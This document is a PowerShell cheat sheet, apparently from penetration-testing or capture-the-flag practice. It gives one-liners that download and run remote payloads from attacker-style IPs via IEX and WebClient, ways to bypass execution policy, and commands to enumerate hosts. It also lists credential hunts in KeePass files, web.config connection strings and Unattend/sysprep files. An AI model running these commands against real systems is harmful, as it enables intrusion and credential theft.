# PowerShell Cheat Sheet

## File Download & Execution

| Command | Description |
|---------|-------------|
| `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.13:8080/40564.exe','c:\root\Downloads\40564.exe')"` | Download file with PowerShell WebClient |
| `c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX((New-Object Net.Webclient).downloadString('http://10.10.16.13:8000/Invoke-Power))` | Download and execute via IEX (Invoke-Expression) |
| `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | Show PowerShell command history |

---

## Execution Policy

| Command | Description |
|---------|-------------|
| `Set-ExecutionPolicy RemoteSigned` | Set policy to allow local scripts, require signed for downloaded scripts |
| `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` | Same, but only for current user |
| `Get-ExecutionPolicy -Scope CurrentUser` | Show current execution policy |
| `Set-ExecutionPolicy Unrestricted -Scope CurrentUser` | Allow all scripts; prompts for internet scripts |
| `Set-ExecutionPolicy Unrestricted` | Same as above |
| `Get-ExecutionPolicy` | Show current policy |
| `powershell -noexit -ExecutionPolicy Bypass -File MyScript.ps1` | Run script bypassing execution policy, keep PS open |

**Execution Policy Modes:**
- Restricted → No scripts allowed  
- AllSigned → Only signed scripts  
- RemoteSigned → Local scripts allowed, downloaded must be signed  
- Unrestricted → Prompts for downloaded scripts, local always allowed  
- Bypass → No restrictions  

Reference:  
[MS Docs - Set-ExecutionPolicy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy)

---

## AD and User Enumeration

| Command | Description |
|---------|-------------|
| `Get-ADUser` | Enumerate AD users (requires RSAT, AD machine) |
| `Get-WmiObject win32_useraccount \| Select domain,name,sid` | Enumerate users with SIDs (Registry: HKLM\...\ProfileList) |

---

## Commands

| Command | Description |
|---------|-------------|
| `show-command` | Show command window GUI |
| `Invoke-Expression -Command $cmd` | Run string as command |
| `Invoke-WebRequest -uri "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"` | Download file with Invoke-WebRequest |
| `Invoke-History -Id 2` | Run previous command from history (id=2) |
| `Start-Process -FilePath cmd` | Start cmd.exe via PowerShell |

## System & User Enumeration

| Command | Description |
|---------|-------------|
| `Get-NetComputer` | Enumerate computers in AD |
| `Get-LocalUser` | Enumerate local users |
| `Get-LocalGroup` | Enumerate local groups |
| `Get-LocalGroupMember` | Enumerate members of local groups |
| `Get-ComputerInfo` | Show detailed system info |
| `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname` | Show installed apps (32-bit) |
| `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname` | Show installed apps (64-bit) |
| `Get-Process \| Select ProcessName, Path` | Show running processes |
| `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` | Search KeePass DB |
| `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue` | Search text/ini files |
| `Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` | Search common document files |
| `Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync` | Check AD Sync service config |
| `Get-ChildItem -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services \| ft name` | Enumerate service registry |
| `Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' \| ft Parent,Name,LastWriteTime` | Show installed software and last update |
| `Get-CimInstance -ClassName win32_service` | Enumerate services |
| `Get-CimInstance -ClassName win32_service \| Select Name, StartMode \| Where-Object {$_.StartMode -like 'auto'}` | Show services with auto startup |
| `Get-ChildItem Registry::HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services \| ForEach-Object { if ($_.GetValue("ImagePath")) { [PSCustomObject]@{ Name = $_.PSChildName; ImagePath = $_.GetValue("ImagePath") } } } \| findstr DVRWatch` | Show services and their executables (filter: DVRWatch) |
| `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" \| Format-list -Property * -Force` | Show details of specific executable |
| `Get-Item -path flag.txt -Stream *` | Check file alternate data streams |
| `tasklist /v` | Show running processes |
| `tasklist /v /fi "username eq system"` | Show processes running as SYSTEM |
| `Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE \| ft Name` | Show installed software list |
| `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \| fl` | Show ACL required for NetSessionEnum |


## PowerShell Variables

| Variable | Description |
|----------|-------------|
| `$PSVersionTable` | Show PowerShell version info |
| `$host` | Show PowerShell host info (similar to PSVersionTable) |


## Windows Logs & Event Viewer

| Path / Command | Description |
|----------------|-------------|
| `C:\Windows\System32\winevt\Logs` | Default Event Log storage |
| `C:\Windows\System32\config` | Registry hives (HKLM, SAM, etc.) |
| `c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe` | Native PowerShell execution path |


## IIS & Web Configurations

| Path / Command | Description |
|----------------|-------------|
| `C:\inetpub\wwwroot\web.config` | IIS web server configuration file |
| `C:\Windows\Microsoft.NET\Framework64\{version}\Config\web.config` | .NET Framework configuration file |
| `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config \| findstr connectionString` | Extract DB connection strings |


## Windows Deployment Services - Credential Files

| Path | Description |
|------|-------------|
| `C:\Unattend.xml` | Windows unattended setup file (may contain passwords) |
| `C:\Windows\Panther\Unattend.xml` | Same (Panther setup folder) |
| `C:\Windows\Panther\Unattend\Unattend.xml` | Unattended setup credentials |
| `C:\Windows\system32\sysprep.inf` | Sysprep configuration (may contain plaintext credentials) |
| `C:\Windows\system32\sysprep\sysprep.xml` | Sysprep configuration (XML format) |


